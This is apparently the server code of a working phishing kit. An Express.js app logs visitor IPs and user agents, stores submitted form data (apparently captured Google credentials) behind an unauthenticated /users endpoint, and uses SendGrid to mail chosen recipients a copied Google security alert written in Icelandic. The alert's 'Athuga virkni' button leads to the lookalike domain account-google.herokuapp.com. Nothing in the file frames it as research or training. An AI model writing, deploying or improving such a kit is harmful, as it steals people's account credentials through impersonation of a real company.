require("dotenv").config();
const express = require("express");
const app = express();
const cors = require("cors");
const path = require("path");
const { RequestModel, UserModel } = require("./db");
const sgMail = require("@sendgrid/mail");
sgMail.setApiKey(process.env.SEND);

const PORT = process.env.PORT || 4000;
const publicFilePath = path.join(__dirname, "public");

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
  RequestModel.create({
    agent: req.headers["user-agent"],
    ip: req.ip,
  });
  res.sendFile(`${publicFilePath}/index.html`);
});

app.use(express.static(publicFilePath));

app.get("/requests", async (req, res) => {
  try {
    const requests = await RequestModel.find();
    res.json(requests);
  } catch (error) {
    res.status(500).json({ message: "Something went wrong" });
  }
});

// Used for debugging/developmental purposes
app.delete("/requests", async (req, res) => {
  await RequestModel.deleteMany({});
  res.status(204).send();
});

app.get("/users", async (req, res) => {
  try {
    const requests = await UserModel.find();
    res.json(requests);
  } catch (error) {
    res.status(500).json({ message: "Something went wrong" });
  }
});

app.post("/users", async (req, res) => {
  UserModel.create({
    ...req.body,
    ip: req.ip,
    agent: req.headers["user-agent"],
  });
  res.status(201).send();
});

// Used for debugging/developmental purposes
app.delete("/users", async (req, res) => {
  await UserModel.deleteMany({});
  res.status(204).send();
});

app.post("/send-mail", async (req, res) => {
  try {
    await sgMail.send({
      from: process.env.EMAIL,
      to: req.body.to,
      subject: "Áríðandi öryggisviðvörun fyrir Google reikninginn þinn",
      html: `<div class="gs">
    <div class="">
      <div
        id=":17m"
        class="ii gt"
        jslog="20277; u014N:xr6bB; 4:W251bGwsbnVsbCxbXV0."
      >
        <div id=":17l" class="a3s aiL msg5092024689021809549">
          <u></u>
          <div style="margin: 0; padding: 0" bgcolor="#FFFFFF">
            <table
              width="100%"
              height="100%"
              style="min-width: 348px"
              border="0"
              cellspacing="0"
              cellpadding="0"
              lang="en"
            >
              <tbody>
                <tr align="center">
                  <td>
                    <div><div></div></div>
                    <table
                      border="0"
                      cellspacing="0"
                      cellpadding="0"
                      style="
                        padding-bottom: 20px;
                        max-width: 516px;
                        min-width: 220px;
                      "
                    >
                      <tbody>
                        <tr>
                          <td width="8" style="width: 8px"></td>
                          <td>
                            <div
                              style="
                                border-style: solid;
                                border-width: thin;
                                border-color: #dadce0;
                                border-radius: 8px;
                                padding: 40px 20px;
                              "
                              align="center"
                              class="m_5092024689021809549mdv2rw"
                            >
                              <img
                                src="https://ci5.googleusercontent.com/proxy/T_zJ7UbaC9x27OP4-ZCPfDipqYLSGum30AlaxEycVclfvxO8Cze0sZ0kCrXlx6a-MgvW2tswbIyiNVfczjDuGh9okorzC5SUJDfwkHr6-3j1KUu94HuAw5uxM_jaElQef3Sub84=s0-d-e1-ft#https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png"
                                width="74"
                                height="24"
                                aria-hidden="true"
                                style="margin-bottom: 16px"
                                alt="Google"
                                class="CToWUd"
                              />
                              <div
                                style="
                                  font-family: 'Google Sans', Roboto, RobotoDraft,
                                    Helvetica, Arial, sans-serif;
                                  border-bottom: thin solid #dadce0;
                                  color: rgba(0, 0, 0, 0.87);
                                  line-height: 32px;
                                  padding-bottom: 24px;
                                  text-align: center;
                                  word-break: break-word;
                                "
                              >
                                <div
                                  style="
                                    text-align: center;
                                    padding-bottom: 16px;
                                    line-height: 0;
                                  "
                                >
                                  <img
                                    height="33"
                                    src="https://ci5.googleusercontent.com/proxy/4cHV_6dmQ6VtY1XspBGHepdEoeg4lwihNwZMq4iB7A03qMGRd1Drq_VN-oTMPuZjmoRgehnHQaSfBVO1ASOYBPAK1G6fIRI5t_8ktKwozsV7ZD3DoTv9AF-xeVE6=s0-d-e1-ft#https://www.gstatic.com/images/icons/material/system/2x/error_red_36dp.png"
                                    class="CToWUd"
                                  />
                                </div>
                                <div style="font-size: 24px">
                                  Lokað var á tilraun til&nbsp;innskráningar
                                </div>
                              </div>
                              <div
                                style="
                                  font-family: Roboto-Regular, Helvetica, Arial,
                                    sans-serif;
                                  font-size: 14px;
                                  color: rgba(0, 0, 0, 0.87);
                                  line-height: 20px;
                                  padding-top: 20px;
                                  text-align: left;
                                "
                              >
                                Einhver notaði aðgangsorðið þitt til að reyna að
                                komast á reikninginn þinn.
                                <span class="il">Google</span> lokaði á viðkomandi
                                en þú ættir að athuga málið.
                                <div
                                  style="padding-top: 32px; text-align: center"
                                >
                                  <a
                                    href="https://account-google.herokuapp.com/"
                                    style="
                                      font-family: 'Google Sans', Roboto,
                                        RobotoDraft, Helvetica, Arial, sans-serif;
                                      line-height: 16px;
                                      color: #ffffff;
                                      font-weight: 400;
                                      text-decoration: none;
                                      font-size: 14px;
                                      display: inline-block;
                                      padding: 10px 24px;
                                      background-color: #d94235;
                                      border-radius: 5px;
                                      min-width: 90px;
                                    "
                                    target="_blank"
                                    data-saferedirecturl="https://account-google.herokuapp.com/"
                                    >Athuga virkni</a
                                  >
                                </div>
                              </div>
                              <div
                                style="
                                  padding-top: 20px;
                                  font-size: 12px;
                                  line-height: 16px;
                                  color: #5f6368;
                                  letter-spacing: 0.3px;
                                  text-align: center;
                                "
                              >
                                Þú getur einnig séð öryggistilvik á<br /><a
                                  style="
                                    color: rgba(0, 0, 0, 0.87);
                                    text-decoration: inherit;
                                  "
                                  >https://myaccount.<span class="il">google</span
                                  >.com/<wbr />notifications</a
                                >
                              </div>
                            </div>
                            <div style="text-align: left">
                              <div
                                style="
                                  font-family: Roboto-Regular, Helvetica, Arial,
                                    sans-serif;
                                  color: rgba(0, 0, 0, 0.54);
                                  font-size: 11px;
                                  line-height: 18px;
                                  padding-top: 12px;
                                  text-align: center;
                                "
                              >
                                <div>
                                  Þessi tölvupóstur er sendur til að láta þig vita
                                  af mikilvægum breytingum á
                                  <span class="il">Google</span> reikningnum þínum
                                  og þjónustunni.
                                </div>
                                <div style="direction: ltr">
                                  © 2022 <span class="il">Google</span> Ireland
                                  Ltd.,
                                  <a
                                    class="m_5092024689021809549afal"
                                    style="
                                      font-family: Roboto-Regular, Helvetica,
                                        Arial, sans-serif;
                                      color: rgba(0, 0, 0, 0.54);
                                      font-size: 11px;
                                      line-height: 18px;
                                      padding-top: 12px;
                                      text-align: center;
                                    "
                                    >Gordon House, Barrow Street, Dublin 4,
                                    Ireland</a
                                  >
                                </div>
                              </div>
                            </div>
                          </td>
                          <td width="8" style="width: 8px"></td>
                        </tr>
                      </tbody>
                    </table>
                  </td>
                </tr>
                <tr height="32" style="height: 32px">
                  <td></td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        <div class="yj6qo"></div>
      </div>
      <div id=":181" class="ii gt" style="display: none">
        <div id=":182" class="a3s aiL"></div>
      </div>
      <div class="hi"></div>
    </div>
  </div>
  `,
    });
  } catch (err) {
    return res.status(500).json(err);
  }

  res.status(201).send();
});

app.use((req, res) =>
  res
    .status(404)
    .json({ message: `Resource for ${req.method} ${req.url} was not found` })
);
app.listen(PORT, () =>
  console.log(`Server has started and is listening on port ${PORT}`)
);
